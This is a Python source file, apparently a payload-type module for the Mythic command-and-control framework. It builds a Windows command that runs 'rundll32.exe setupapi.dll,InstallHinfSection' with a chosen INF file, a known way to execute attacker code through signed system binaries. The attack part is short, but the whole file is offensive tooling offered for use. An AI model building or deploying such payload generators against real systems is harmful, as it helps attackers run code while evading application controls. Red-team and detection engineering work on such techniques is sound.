import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os


class cmd_setupapi_local_inf(PayloadType):
    name = "cmd_setupapi_local_inf"
    file_extension = "cmd"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    note = """Executes setupapi.exe to a INF file"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "cmd"
    agent_icon_path = agent_path / "agent_functions" / "cmd.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "binary",
            parameter_type=BuildParameterType.String,
            default_value="rundll32.exe",
            description="Rundll32 binary",
        ),
        BuildParameter(
            name = "inf_path",
            parameter_type=BuildParameterType.String,
            description="INF path",
        ),
        BuildParameter(
            name = "main_section",
            parameter_type=BuildParameterType.String,
            default_value="DefaultInstall",
            description="Main section name",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            binary = self.get_parameter('binary')
            inf_path = self.get_parameter('inf_path')
            main_section = self.get_parameter('main_section')

            payload = "%s setupapi.dll,InstallHinfSection %s 128 %s" % (binary, main_section, inf_path)

            resp.payload = payload
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
